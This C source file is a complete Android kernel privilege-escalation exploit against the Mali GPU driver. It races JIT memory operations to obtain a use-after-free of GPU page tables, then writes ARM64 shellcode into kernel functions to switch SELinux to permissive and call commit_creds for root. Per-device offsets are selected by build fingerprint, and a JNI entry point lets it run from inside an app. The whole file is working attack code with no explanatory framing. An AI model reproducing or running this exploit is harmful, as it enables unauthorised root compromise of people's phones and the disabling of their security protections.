#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/system_properties.h>
#include <sys/syscall.h>
#include <pthread.h>

#include "offsets.h"
#include "mali.h"
#include "mali_base_jm_kernel.h"
#include "midgard.h"

#ifdef SHELL
#define LOG(fmt, ...) printf(fmt, ##__VA_ARGS__)
#else
#include <android/log.h>
#define LOG(fmt, ...) __android_log_print(ANDROID_LOG_ERROR, "exploit", fmt, ##__VA_ARGS__)

#endif //SHELL

#define MALI "/dev/mali0"

#define PAGE_SHIFT 12

#define PFN_DOWN(x)	((x) >> PAGE_SHIFT)

#define FREED_NUM 1

#define FLUSH_SIZE (0x1000 * 0x1000)

#define POOL_SIZE 16384

#define RESERVED_SIZE 12

#define TOTAL_RESERVED_SIZE 1024

#define FLUSH_REGION_SIZE 500

#define GROW_SIZE 0x2000

#define RECLAIM_SIZE (3 * POOL_SIZE)

#define JIT_PAGES 0x1000000

#define JIT_GROUP_ID 1

#define KERNEL_BASE 0x40008000

#define OVERWRITE_INDEX 256

#define ADRP_INIT_INDEX 0

#define ADD_INIT_INDEX 1

#define ADRP_COMMIT_INDEX 2

#define ADD_COMMIT_INDEX 3

static uint64_t sel_read_enforce;

static uint64_t avc_deny;

/*
Overwriting SELinux to permissive
  strb wzr, [x0]
  mov x0, #0
  ret
*/
static uint32_t permissive[3] = {0x3900001f, 0xd2800000,0xd65f03c0};

static uint32_t root_code[8] = {0};

static uint8_t atom_number = 1;
static void* flush_regions[FLUSH_REGION_SIZE];
static uint64_t reclaim_va[RECLAIM_SIZE];
static uint64_t reserved[TOTAL_RESERVED_SIZE/RESERVED_SIZE];
static bool commit_failed = false;
static bool g_ready_commit = false;

struct base_mem_handle {
	struct {
		__u64 handle;
	} basep;
};

struct base_mem_aliasing_info {
	struct base_mem_handle handle;
	__u64 offset;
	__u64 length;
};

static int open_dev(char* name) {
  int fd = open(name, O_RDWR);
  if (fd == -1) {
    err(1, "cannot open %s\n", name);
  }
  return fd;
}

uint8_t increase_atom_number() {
  uint8_t out = atom_number;
  if (++atom_number == 0) {
    atom_number++;
  }
  return out;
}

void setup_mali(int fd, int group_id) {
  struct kbase_ioctl_version_check param = {0};
  if (ioctl(fd, KBASE_IOCTL_VERSION_CHECK, &param) < 0) {
    err(1, "version check failed\n");
  }
  struct kbase_ioctl_set_flags set_flags = {group_id << 3};
  if (ioctl(fd, KBASE_IOCTL_SET_FLAGS, &set_flags) < 0) {
    err(1, "set flags failed\n");
  }
}

void* setup_tracking_page(int fd) {
  void* region = mmap(NULL, 0x1000, 0, MAP_SHARED, fd, BASE_MEM_MAP_TRACKING_HANDLE);
  if (region == MAP_FAILED) {
    err(1, "setup tracking page failed");
  }
  return region;
}

void jit_init(int fd, uint64_t va_pages, uint64_t trim_level, int group_id) {
  struct kbase_ioctl_mem_jit_init init = {0};
  init.va_pages = va_pages;
  init.max_allocations = 255;
  init.trim_level = trim_level;
  init.group_id = group_id;
  init.phys_pages = va_pages;

  if (ioctl(fd, KBASE_IOCTL_MEM_JIT_INIT, &init) < 0) {
    err(1, "jit init failed\n");
  }
}

uint64_t jit_allocate(int fd, uint8_t atom_number, uint8_t id, uint64_t va_pages, uint64_t commit_pages, uint8_t bin_id, uint16_t usage_id, uint64_t gpu_alloc_addr) {
  struct base_jit_alloc_info info = {0};
  struct base_jd_atom_v2 atom = {0};

  info.id = id;
  info.gpu_alloc_addr = gpu_alloc_addr;
  info.va_pages = va_pages;
  info.commit_pages = commit_pages;
  info.extension = 0x1000;
  info.bin_id = bin_id;
  info.usage_id = usage_id;

  atom.jc = (uint64_t)(&info);
  atom.atom_number = atom_number;
  atom.core_req = BASE_JD_REQ_SOFT_JIT_ALLOC;
  atom.nr_extres = 1;
  struct kbase_ioctl_job_submit submit = {0};
  submit.addr = (uint64_t)(&atom);
  submit.nr_atoms = 1;
  submit.stride = sizeof(struct base_jd_atom_v2);
  if (ioctl(fd, KBASE_IOCTL_JOB_SUBMIT, &submit) < 0) {
    err(1, "submit job failed\n");
  }
  return *((uint64_t*)gpu_alloc_addr);
}

void jit_free(int fd, uint8_t atom_number, uint8_t id) {
  uint8_t free_id = id;

  struct base_jd_atom_v2 atom = {0};

  atom.jc = (uint64_t)(&free_id);
  atom.atom_number = atom_number;
  atom.core_req = BASE_JD_REQ_SOFT_JIT_FREE;
  atom.nr_extres = 1;
  struct kbase_ioctl_job_submit submit = {0};
  submit.addr = (uint64_t)(&atom);
  submit.nr_atoms = 1;
  submit.stride = sizeof(struct base_jd_atom_v2);
  if (ioctl(fd, KBASE_IOCTL_JOB_SUBMIT, &submit) < 0) {
    err(1, "submit job failed\n");
  }

}

void mem_flags_change(int fd, uint64_t gpu_addr, uint32_t flags, int ignore_results) {
  struct kbase_ioctl_mem_flags_change change = {0};
  change.flags = flags;
  change.gpu_va = gpu_addr;
  change.mask = flags;
  if (ignore_results) {
    ioctl(fd, KBASE_IOCTL_MEM_FLAGS_CHANGE, &change);
    return;
  }
  if (ioctl(fd, KBASE_IOCTL_MEM_FLAGS_CHANGE, &change) < 0) {
    err(1, "flags_change failed\n");
  }
}

void mem_alloc(int fd, union kbase_ioctl_mem_alloc* alloc) {
  if (ioctl(fd, KBASE_IOCTL_MEM_ALLOC, alloc) < 0) {
    err(1, "mem_alloc failed\n");
  }
}

void mem_alias(int fd, union kbase_ioctl_mem_alias* alias) {
  if (ioctl(fd, KBASE_IOCTL_MEM_ALIAS, alias) < 0) {
    err(1, "mem_alias failed\n");
  }
}

void mem_query(int fd, union kbase_ioctl_mem_query* query) {
  if (ioctl(fd, KBASE_IOCTL_MEM_QUERY, query) < 0) {
    err(1, "mem_query failed\n");
  }
}

void mem_commit(int fd, uint64_t gpu_addr, uint64_t pages) {
  struct kbase_ioctl_mem_commit commit = {.gpu_addr = gpu_addr, pages = pages};
  if (ioctl(fd, KBASE_IOCTL_MEM_COMMIT, &commit) < 0) {
    LOG("commit failed\n");
    commit_failed = true;
  }
}

void* map_gpu(int mali_fd, unsigned int va_pages, unsigned int commit_pages, bool read_only, int group) {
  union kbase_ioctl_mem_alloc alloc = {0};
  alloc.in.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_CPU_WR | (group << 22);
  int prot = PROT_READ;
  if (!read_only) {
    alloc.in.flags |= BASE_MEM_PROT_GPU_WR;
    prot |= PROT_WRITE;
  }
  alloc.in.va_pages = va_pages;
  alloc.in.commit_pages = commit_pages;
  mem_alloc(mali_fd, &alloc);
  void* region = mmap(NULL, 0x1000 * va_pages, prot, MAP_SHARED, mali_fd, alloc.out.gpu_va);
  if (region == MAP_FAILED) {
    err(1, "mmap failed");
  }
  return region;
}

uint64_t alloc_mem(int mali_fd, unsigned int pages) {
  union kbase_ioctl_mem_alloc alloc = {0};
  alloc.in.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_CPU_WR | BASE_MEM_PROT_GPU_WR;
  int prot = PROT_READ | PROT_WRITE;
  alloc.in.va_pages = pages;
  alloc.in.commit_pages = pages;
  mem_alloc(mali_fd, &alloc);
  return alloc.out.gpu_va;
}

void free_mem(int mali_fd, uint64_t gpuaddr) {
  struct kbase_ioctl_mem_free mem_free = {.gpu_addr = gpuaddr};
  if (ioctl(mali_fd, KBASE_IOCTL_MEM_FREE, &mem_free) < 0) {
    err(1, "free_mem failed\n");
  }
}

uint64_t drain_mem_pool(int mali_fd) {
  union kbase_ioctl_mem_alloc alloc = {0};
  alloc.in.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_CPU_WR | BASE_MEM_PROT_GPU_WR | (1 << 22);
  int prot = PROT_READ | PROT_WRITE;
  alloc.in.va_pages = POOL_SIZE;
  alloc.in.commit_pages = POOL_SIZE;
  mem_alloc(mali_fd, &alloc);
  return alloc.out.gpu_va;
}

void release_mem_pool(int mali_fd, uint64_t drain) {
  struct kbase_ioctl_mem_free mem_free = {.gpu_addr = drain};
  if (ioctl(mali_fd, KBASE_IOCTL_MEM_FREE, &mem_free) < 0) {
    err(1, "free_mem failed\n");
  }
}

void* flush(int idx) {
  void* region = mmap(NULL, FLUSH_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
  if (region == MAP_FAILED) err(1, "flush failed");
  memset(region, idx, FLUSH_SIZE);
  return region;
}

void reserve_pages(int mali_fd, int pages, int nents, uint64_t* reserved_va) {
  for (int i = 0; i < nents; i++) {
    union kbase_ioctl_mem_alloc alloc = {0};
    alloc.in.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_CPU_WR | BASE_MEM_PROT_GPU_WR | (1 << 22);
    int prot = PROT_READ | PROT_WRITE;
    alloc.in.va_pages = pages;
    alloc.in.commit_pages = pages;
    mem_alloc(mali_fd, &alloc);
    reserved_va[i] = alloc.out.gpu_va;
  }
}

void map_reserved(int mali_fd, int pages, int nents, uint64_t* reserved_va) {
  for (int i = 0; i < nents; i++) {
    void* reserved = mmap(NULL, 0x1000 * pages, PROT_READ | PROT_WRITE, MAP_SHARED, mali_fd, reserved_va[i]);
    if (reserved == MAP_FAILED) {
      err(1, "mmap reserved failed");
    }
    reserved_va[i] = (uint64_t)reserved;
  }
}

uint32_t lo32(uint64_t x) {
  return x & 0xffffffff;
}

uint32_t hi32(uint64_t x) {
  return x >> 32;
}

uint32_t write_adrp(int rd, uint64_t pc, uint64_t label) {
  uint64_t pc_page = pc >> 12;
  uint64_t label_page = label >> 12;
  int64_t offset = (label_page - pc_page) << 12;
  int64_t immhi_mask = 0xffffe0;
  int64_t immhi = offset >> 14;
  int32_t immlo = (offset >> 12) & 0x3;
  uint32_t adpr = rd & 0x1f;
  adpr |= (1 << 28);
  adpr |= (1 << 31); //op
  adpr |= immlo << 29;
  adpr |= (immhi_mask & (immhi << 5));
  return adpr;
}

void fixup_root_shell(uint64_t init_cred, uint64_t commit_cred, uint64_t read_enforce, uint32_t add_init, uint32_t add_commit) {

  uint32_t init_adpr = write_adrp(0, read_enforce, init_cred);
  //Sets x0 to init_cred
  root_code[ADRP_INIT_INDEX] = init_adpr;
  root_code[ADD_INIT_INDEX] = add_init;
  //Sets x8 to commit_creds
  root_code[ADRP_COMMIT_INDEX] = write_adrp(8, read_enforce, commit_cred);
  root_code[ADD_COMMIT_INDEX] = add_commit;
  root_code[4] = 0xa9bf7bfd; // stp x29, x30, [sp, #-0x10]
  root_code[5] = 0xd63f0100; // blr x8
  root_code[6] = 0xa8c17bfd; // ldp x29, x30, [sp], #0x10
  root_code[7] = 0xd65f03c0; // ret
}

uint64_t set_addr_lv3(uint64_t addr) {
  uint64_t pfn = addr >> PAGE_SHIFT;
  pfn &= ~ 0x1FFUL;
  pfn |= 0x100UL;
  return pfn << PAGE_SHIFT;
}

static inline uint64_t compute_pt_index(uint64_t addr, int level) {
  uint64_t vpfn = addr >> PAGE_SHIFT;
  vpfn >>= (3 - level) * 9;
  return vpfn & 0x1FF;
}

void write_to(int mali_fd, uint64_t gpu_addr, uint64_t value, int atom_number, enum mali_write_value_type type) {
  void* jc_region = map_gpu(mali_fd, 1, 1, false, 0);
  struct MALI_JOB_HEADER jh = {0};
  jh.is_64b = true;
  jh.type = MALI_JOB_TYPE_WRITE_VALUE;

  struct MALI_WRITE_VALUE_JOB_PAYLOAD payload = {0};
  payload.type = type;
  payload.immediate_value = value;
  payload.address = gpu_addr;

  MALI_JOB_HEADER_pack((uint32_t*)jc_region, &jh);
  MALI_WRITE_VALUE_JOB_PAYLOAD_pack((uint32_t*)jc_region + 8, &payload);
  uint32_t* section = (uint32_t*)jc_region;
  struct base_jd_atom_v2 atom = {0};
  atom.jc = (uint64_t)jc_region;
  atom.atom_number = atom_number;
  atom.core_req = BASE_JD_REQ_CS;
  struct kbase_ioctl_job_submit submit = {0};
  submit.addr = (uint64_t)(&atom);
  submit.nr_atoms = 1;
  submit.stride = sizeof(struct base_jd_atom_v2);
  if (ioctl(mali_fd, KBASE_IOCTL_JOB_SUBMIT, &submit) < 0) {
    err(1, "submit job failed\n");
  }
  usleep(10000);
}

void write_func(int mali_fd, uint64_t func, uint64_t* reserved, uint64_t size, uint32_t* shellcode, uint64_t code_size) {
  uint64_t func_offset = (func + KERNEL_BASE) % 0x1000;
  uint64_t curr_overwrite_addr = 0;
  for (int i = 0; i < size; i++) {
    uint64_t base = reserved[i];
    uint64_t end = reserved[i] + RESERVED_SIZE * 0x1000;
    uint64_t start_idx = compute_pt_index(base, 3);
    uint64_t end_idx = compute_pt_index(end, 3);
    for (uint64_t addr = base; addr < end; addr += 0x1000) {
      uint64_t overwrite_addr = set_addr_lv3(addr);
      if (curr_overwrite_addr != overwrite_addr) {
        LOG("overwrite addr : %lx %lx\n", overwrite_addr + func_offset, func_offset);
        curr_overwrite_addr = overwrite_addr;
        for (int code = code_size - 1; code >= 0; code--) {
          write_to(mali_fd, overwrite_addr + func_offset + code * 4, shellcode[code], increase_atom_number(), MALI_WRITE_VALUE_TYPE_IMMEDIATE_32);
        }
        usleep(300000);
      }
    }
  }
}

int run_enforce() {
  char result = '2';
  sleep(3);
  int enforce_fd = open("/sys/fs/selinux/enforce", O_RDONLY);
  read(enforce_fd, &result, 1);
  close(enforce_fd);
  LOG("result %d\n", result);
  return result;
}

void select_offset() {
  char fingerprint[256];
  int len = __system_property_get("ro.build.fingerprint", fingerprint);
  LOG("fingerprint: %s\n", fingerprint);

  if(!strcmp(fingerprint, CTX_00_04_000)) {
    avc_deny = AVC_DENY_CTX_00_04_000;
    sel_read_enforce = SEL_READ_ENFORCE_CTX_00_04_000;
    fixup_root_shell(INIT_CRED_CTX_00_04_000, COMMIT_CREDS_CTX_00_04_000, SEL_READ_ENFORCE_CTX_00_04_000, ADD_INIT_CTX_00_04_000, ADD_COMMIT_CTX_00_04_000);
    return;
  }

  if(!strcmp(fingerprint, CTX_00_05_000)) {
    avc_deny = AVC_DENY_CTX_00_05_000;
    sel_read_enforce = SEL_READ_ENFORCE_CTX_00_05_000;
    fixup_root_shell(INIT_CRED_CTX_00_05_000, COMMIT_CREDS_CTX_00_05_000, SEL_READ_ENFORCE_CTX_00_05_000, ADD_INIT_CTX_00_05_000, ADD_COMMIT_CTX_00_05_000);
    return;
  }

  if(!strcmp(fingerprint, CTX_00_08_000)) {
    avc_deny = AVC_DENY_CTX_00_08_000;
    sel_read_enforce = SEL_READ_ENFORCE_CTX_00_08_000;
    fixup_root_shell(INIT_CRED_CTX_00_08_000, COMMIT_CREDS_CTX_00_08_000, SEL_READ_ENFORCE_CTX_00_08_000, ADD_INIT_CTX_00_08_000, ADD_COMMIT_CTX_00_08_000);
    return;
  }

  if(!strcmp(fingerprint, CTX_00_09_000)) {
    avc_deny = AVC_DENY_CTX_00_09_000;
    sel_read_enforce = SEL_READ_ENFORCE_CTX_00_09_000;
    fixup_root_shell(INIT_CRED_CTX_00_09_000, COMMIT_CREDS_CTX_00_09_000, SEL_READ_ENFORCE_CTX_00_09_000, ADD_INIT_CTX_00_09_000, ADD_COMMIT_CTX_00_09_000);
    return;
  }

  if(!strcmp(fingerprint, CTX_01_00_000)) {
    avc_deny = AVC_DENY_CTX_01_00_000;
    sel_read_enforce = SEL_READ_ENFORCE_CTX_01_00_000;
    fixup_root_shell(INIT_CRED_CTX_01_00_000, COMMIT_CREDS_CTX_01_00_000, SEL_READ_ENFORCE_CTX_01_00_000, ADD_INIT_CTX_01_00_000, ADD_COMMIT_CTX_01_00_000);
    return;
  }

  if(!strcmp(fingerprint, CTX_01_01_001)) {
    avc_deny = AVC_DENY_CTX_01_01_001;
    sel_read_enforce = SEL_READ_ENFORCE_CTX_01_01_001;
    fixup_root_shell(INIT_CRED_CTX_01_01_001, COMMIT_CREDS_CTX_01_01_001, SEL_READ_ENFORCE_CTX_01_01_001, ADD_INIT_CTX_01_01_001, ADD_COMMIT_CTX_01_01_001);
    return;
  }

  if(!strcmp(fingerprint, CTX_01_04_000)) {
    avc_deny = AVC_DENY_CTX_01_04_000;
    sel_read_enforce = SEL_READ_ENFORCE_CTX_01_04_000;
    fixup_root_shell(INIT_CRED_CTX_01_04_000, COMMIT_CREDS_CTX_01_04_000, SEL_READ_ENFORCE_CTX_01_04_000, ADD_INIT_CTX_01_04_000, ADD_COMMIT_CTX_01_04_000);
    return;
  }

  if(!strcmp(fingerprint, CTX_01_11_000)) {
    avc_deny = AVC_DENY_CTX_01_11_000;
    sel_read_enforce = SEL_READ_ENFORCE_CTX_01_11_000;
    fixup_root_shell(INIT_CRED_CTX_01_11_000, COMMIT_CREDS_CTX_01_11_000, SEL_READ_ENFORCE_CTX_01_11_000, ADD_INIT_CTX_01_11_000, ADD_COMMIT_CTX_01_11_000);
    return;
  }

  if(!strcmp(fingerprint, CTZ_00_03_000)) {
    avc_deny = AVC_DENY_CTZ_00_03_000;
    sel_read_enforce = SEL_READ_ENFORCE_CTZ_00_03_000;
    fixup_root_shell(INIT_CRED_CTZ_00_03_000, COMMIT_CREDS_CTZ_00_03_000, SEL_READ_ENFORCE_CTZ_00_03_000, ADD_INIT_CTZ_00_03_000, ADD_COMMIT_CTZ_00_03_000);
    return;
  }

  if(!strcmp(fingerprint, CTZ_01_00_000)) {
    avc_deny = AVC_DENY_CTZ_01_00_000;
    sel_read_enforce = SEL_READ_ENFORCE_CTZ_01_00_000;
    fixup_root_shell(INIT_CRED_CTZ_01_00_000, COMMIT_CREDS_CTZ_01_00_000, SEL_READ_ENFORCE_CTZ_01_00_000, ADD_INIT_CTZ_01_00_000, ADD_COMMIT_CTZ_01_00_000);
    return;
  }

  if(!strcmp(fingerprint, CTZ_01_01_000)) {
    avc_deny = AVC_DENY_CTZ_01_01_000;
    sel_read_enforce = SEL_READ_ENFORCE_CTZ_01_01_000;
    fixup_root_shell(INIT_CRED_CTZ_01_01_000, COMMIT_CREDS_CTZ_01_01_000, SEL_READ_ENFORCE_CTZ_01_01_000, ADD_INIT_CTZ_01_01_000, ADD_COMMIT_CTZ_01_01_000);
    return;
  }

  if(!strcmp(fingerprint, CTZ_01_02_004)) {
    avc_deny = AVC_DENY_CTZ_01_02_004;
    sel_read_enforce = SEL_READ_ENFORCE_CTZ_01_02_004;
    fixup_root_shell(INIT_CRED_CTZ_01_02_004, COMMIT_CREDS_CTZ_01_02_004, SEL_READ_ENFORCE_CTZ_01_02_004, ADD_INIT_CTZ_01_02_004, ADD_COMMIT_CTZ_01_02_004);
    return;
  }

  if(!strcmp(fingerprint, CTZ_01_02_005)) {
    avc_deny = AVC_DENY_CTZ_01_02_005;
    sel_read_enforce = SEL_READ_ENFORCE_CTZ_01_02_005;
    fixup_root_shell(INIT_CRED_CTZ_01_02_005, COMMIT_CREDS_CTZ_01_02_005, SEL_READ_ENFORCE_CTZ_01_02_005, ADD_INIT_CTZ_01_02_005, ADD_COMMIT_CTZ_01_02_005);
    return;
  }

  if(!strcmp(fingerprint, CTZ_01_03_000)) {
    avc_deny = AVC_DENY_CTZ_01_03_000;
    sel_read_enforce = SEL_READ_ENFORCE_CTZ_01_03_000;
    fixup_root_shell(INIT_CRED_CTZ_01_03_000, COMMIT_CREDS_CTZ_01_03_000, SEL_READ_ENFORCE_CTZ_01_03_000, ADD_INIT_CTZ_01_03_000, ADD_COMMIT_CTZ_01_03_000);
    return;
  }

  err(1, "unable to match build id\n");
}

void cleanup(int mali_fd, uint64_t pgd) {
  write_to(mali_fd, pgd + OVERWRITE_INDEX * sizeof(uint64_t), 2, increase_atom_number(), MALI_WRITE_VALUE_TYPE_IMMEDIATE_64);
}

void write_shellcode(int mali_fd, int mali_fd2, uint64_t pgd, uint64_t* reserved) {
  uint64_t avc_deny_addr = (((avc_deny + KERNEL_BASE) >> PAGE_SHIFT) << PAGE_SHIFT)| 0x443;
  write_to(mali_fd, pgd + OVERWRITE_INDEX * sizeof(uint64_t), avc_deny_addr, increase_atom_number(), MALI_WRITE_VALUE_TYPE_IMMEDIATE_64);

  usleep(100000);
  //Go through the reserve pages addresses to write to avc_denied with our own shellcode
  write_func(mali_fd2, avc_deny, reserved, TOTAL_RESERVED_SIZE/RESERVED_SIZE, &(permissive[0]), sizeof(permissive)/sizeof(uint32_t));

  //Triggers avc_denied to disable SELinux
  open("/dev/kmsg", O_RDONLY);

  uint64_t sel_read_enforce_addr = (((sel_read_enforce + KERNEL_BASE) >> PAGE_SHIFT) << PAGE_SHIFT)| 0x443;
  write_to(mali_fd, pgd + OVERWRITE_INDEX * sizeof(uint64_t), sel_read_enforce_addr, increase_atom_number(), MALI_WRITE_VALUE_TYPE_IMMEDIATE_64);

  //Call commit_creds to overwrite process credentials to gain root
  write_func(mali_fd2, sel_read_enforce, reserved, TOTAL_RESERVED_SIZE/RESERVED_SIZE, &(root_code[0]), sizeof(root_code)/sizeof(uint32_t));
}

void* shrink_jit_mem(void* args) {
  uint64_t* arguments = (uint64_t*)args;
  int mali_fd = arguments[0];
  uint64_t gpu_addr = arguments[1];
  uint64_t pages = arguments[2];
  while (!g_ready_commit) {};
  usleep(10000);
  mem_commit(mali_fd, gpu_addr, pages);
  return NULL;
}

void reclaim_freed_pages(int mali_fd) {
  for (int i = 0; i < RECLAIM_SIZE; i++) {
    reclaim_va[i] = (uint64_t)map_gpu(mali_fd, 1, 1, false, JIT_GROUP_ID);
    uint64_t* this_va = (uint64_t*)(reclaim_va[i]);
    *this_va = 0;
  }
}

uint64_t find_freed_region(int* idx) {
  *idx = -1;
  for (int i = 0; i < RECLAIM_SIZE; i++) {
    uint64_t* this_region = (uint64_t*)(reclaim_va[i]);
    uint64_t val = *this_region;
    if (val >= 0x41 && val < 0x41 + FREED_NUM) {
      *idx = i;
      return val - 0x41;
    }
  }
  return -1;
}

int trigger(int mali_fd2) {

  int mali_fd = open_dev(MALI);

  setup_mali(mali_fd, 0);

  void* tracking_page = setup_tracking_page(mali_fd);
  jit_init(mali_fd, JIT_PAGES, 100, JIT_GROUP_ID);

  g_ready_commit = false;
  commit_failed = false;
  atom_number = 1;
  void* gpu_alloc_addr = map_gpu(mali_fd, 1, 1, false, 0);
  uint64_t first_jit_id = 1;
  uint64_t second_jit_id = 2;

  uint64_t jit_addr = jit_allocate(mali_fd, increase_atom_number(), first_jit_id, FREED_NUM, 0, 0, 0, (uint64_t)gpu_alloc_addr);
  uint64_t jit_addr2 = jit_allocate(mali_fd, increase_atom_number(), second_jit_id, POOL_SIZE * 2, 512 - FREED_NUM, 1, 1, (uint64_t)gpu_alloc_addr);

  if (jit_addr % (512 * 0x1000) != 0 || jit_addr2 < jit_addr || jit_addr2 - jit_addr != FREED_NUM * 0x1000) {
    LOG("incorrect memory layout\n");
    LOG("jit_addr %lx %lx\n", jit_addr, jit_addr2);
    err(1, "incorrect memory layout\n");
  }

  jit_free(mali_fd, increase_atom_number(), second_jit_id);
  pthread_t thread;
  uint64_t args[3];
  args[0] = mali_fd;
  args[1] = jit_addr2;
  args[2] = 0;

  pthread_create(&thread, NULL, &shrink_jit_mem, (void*)&(args[0]));
  g_ready_commit = true;
  jit_allocate(mali_fd, increase_atom_number(), second_jit_id, POOL_SIZE * 2, GROW_SIZE, 1, 1, (uint64_t)gpu_alloc_addr);

  pthread_join(thread, NULL);
  if (commit_failed) {
    close(mali_fd);
    return -1;
  }
  jit_free(mali_fd, increase_atom_number(), second_jit_id);
  for (int i = 0; i < FLUSH_REGION_SIZE; i++) {
    union kbase_ioctl_mem_query query = {0};
    query.in.gpu_addr = jit_addr2;
    query.in.query = KBASE_MEM_QUERY_COMMIT_SIZE;
    flush_regions[i] = flush(i);
    if (ioctl(mali_fd, KBASE_IOCTL_MEM_QUERY, &query) < 0) {
      LOG("region freed\n");
      reclaim_freed_pages(mali_fd);
      uint64_t start_addr = jit_addr2 + 0x1000 * (512 - FREED_NUM);
      for (int j = 0; j < FREED_NUM; j++) {
        write_to(mali_fd, start_addr + j * 0x1000, 0x41 + j, increase_atom_number(), MALI_WRITE_VALUE_TYPE_IMMEDIATE_64);
      }
      int idx = -1;
      uint64_t offset = find_freed_region(&idx);
      if (offset == -1) {
        LOG("unable to find region\n");
        for (int r = 0; r < FLUSH_REGION_SIZE; r++) munmap(flush_regions[r], FLUSH_SIZE);
        close(mali_fd);
        return -1;
      }
      LOG("found region %d at %lx\n", idx, start_addr + offset * 0x1000);
      uint64_t drain = drain_mem_pool(mali_fd);
      release_mem_pool(mali_fd, drain);
      munmap((void*)(reclaim_va[idx]), 0x1000);
      mmap(NULL, 0x1000 * 0x1000, PROT_READ|PROT_WRITE,
                                        MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
      map_reserved(mali_fd2, RESERVED_SIZE, TOTAL_RESERVED_SIZE/RESERVED_SIZE, &(reserved[0]));
      for (int r = 0; r < FLUSH_REGION_SIZE; r++) munmap(flush_regions[r], FLUSH_SIZE);

      uint64_t pgd = start_addr + offset * 0x1000;
      write_shellcode(mali_fd, mali_fd2, pgd, &(reserved[0]));
      run_enforce();
      cleanup(mali_fd, pgd);
      return 0;
    }
  }
  close(mali_fd);
  return -1;
}

#ifdef SHELL

int main() {
  setbuf(stdout, NULL);
  setbuf(stderr, NULL);

  select_offset();

  int mali_fd2 = open_dev(MALI);
  setup_mali(mali_fd2, 1);
  setup_tracking_page(mali_fd2);
  reserve_pages(mali_fd2, RESERVED_SIZE, TOTAL_RESERVED_SIZE/RESERVED_SIZE, &(reserved[0]));
  map_gpu(mali_fd2, 1, 1, false, 0);
  if (!trigger(mali_fd2)) {
    system("getenforce");
  }
}
#else
#include <jni.h>
JNIEXPORT int JNICALL
Java_com_example_hellojni_MaliExpService_stringFromJNI( JNIEnv* env, jobject thiz)
{
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);
    select_offset();

    int mali_fd2 = open_dev(MALI);
    setup_mali(mali_fd2, 1);
    setup_tracking_page(mali_fd2);
    reserve_pages(mali_fd2, RESERVED_SIZE, TOTAL_RESERVED_SIZE/RESERVED_SIZE, &(reserved[0]));
    map_gpu(mali_fd2, 1, 1, false, 0);
    if (!trigger(mali_fd2)) {
       LOG("uid: %d euid %d", getuid(), geteuid());
       return 0;
    }
    return -1;
}
#endif
